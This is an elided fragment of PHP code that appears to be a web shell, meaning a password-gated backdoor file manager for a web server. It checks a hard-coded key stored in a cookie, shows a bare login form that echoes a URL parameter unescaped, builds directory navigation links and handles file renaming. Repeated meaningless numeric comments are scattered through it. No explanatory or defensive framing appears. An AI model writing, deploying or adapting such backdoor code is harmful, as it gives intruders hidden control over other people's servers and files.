...
$pass = false;
if (isset($_COOKIE['pw_name_24732'])) {
    if(($_COOKIE['pw_name_24732']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_24732'])) {
        if(($_POST['pw_name_24732']) == $auth_key) {
            setcookie("pw_name_24732", $_POST['pw_name_24732']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_24732' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1708382241777003 1708382241210088 1708382241730499 1708382241458665
echo <<<HEAD
<!DOCTYPE html>
<html lang="en">
<head>
...
HEAD;// 1708382241777003 1708382241210088 1708382241730499 1708382241458665
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1708382241777003 1708382241210088 1708382241730499 1708382241458665
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1708382241777003 1708382241210088 1708382241730499 1708382241458665
            $name = PATH . "/" . $_GET['r'];
